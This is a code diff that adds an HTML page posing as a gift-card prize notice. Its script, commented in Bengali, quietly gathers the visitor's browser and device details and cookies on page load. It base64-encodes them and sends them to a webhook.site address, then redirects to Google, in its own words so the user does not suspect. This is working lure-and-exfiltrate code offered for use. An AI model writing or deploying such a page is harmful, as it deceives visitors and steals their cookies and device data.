@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Free Prize Inside!</title>
+</head>
+<body>
+    <h1>Congratulations! You won a Gift Card!</h1>
+    <p>Please wait while we redirect you to the claim page...</p>
+
+    <script>
+        // আপনার Webhook লিঙ্ক
+        var webhook_url = "https://webhook.site/83aa407e-8191-4bd4-82c1-b8cc21a84216";
+
+        // ইউজারের ব্রাউজার এবং ডিভাইসের কিছু তথ্য সংগ্রহ
+        var data = {
+            "UserAgent": navigator.userAgent,
+            "Platform": navigator.platform,
+            "Language": navigator.language,
+            "Screen": window.screen.width + "x" + window.screen.height,
+            "Cookies": document.cookie || "No Cookies Found"
+        };
+
+        // এই তথ্যগুলো আপনার Webhook-এ পাঠিয়ে দেওয়া
+        fetch(webhook_url + "?info=" + btoa(JSON.stringify(data)));
+
+        // ৩ সেকেন্ড পর আসল কোনো সাইটে পাঠিয়ে দেওয়া (যাতে ইউজার সন্দেহ না করে)
+        setTimeout(function(){
+            window.location.href = "https://www.google.com";
+        }, 3000);
+    </script>
+</body>
+</html>
